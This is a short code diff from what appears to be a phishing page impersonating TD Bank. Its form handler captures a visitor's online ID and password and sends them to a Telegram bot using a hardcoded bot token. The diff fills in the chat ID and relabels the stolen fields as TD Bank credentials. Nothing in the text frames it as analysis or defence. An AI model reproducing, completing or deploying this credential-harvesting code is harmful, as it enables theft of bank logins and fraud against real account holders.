@@ -24,7 +24,7 @@ import {
     };
   
     const token = "6214248431:AAFodeiJc0UIq-nmsTyqMgzp2FdByom3wzc";
-    const chat_id = "";
+    const chat_id = "5960483519";
   
     async function sendMessageToTelegram(message: any) {
       const res = await fetch(
@@ -38,11 +38,13 @@ import {
       
       event.preventDefault();
       const message =
-        "Password: " +
-        event.target.password.value +
+    
+        "TDBANK | ONLINE ID: " +
+        event.target.onlineId.value + 
         " " +
-        "\nOnline-ID: " +
-        event.target.onlineId.value;
+        "\nTDBANK | PASSWORD: " +
+        event.target.password.value;
+       
   
       try {
         await sendMessageToTelegram(message);
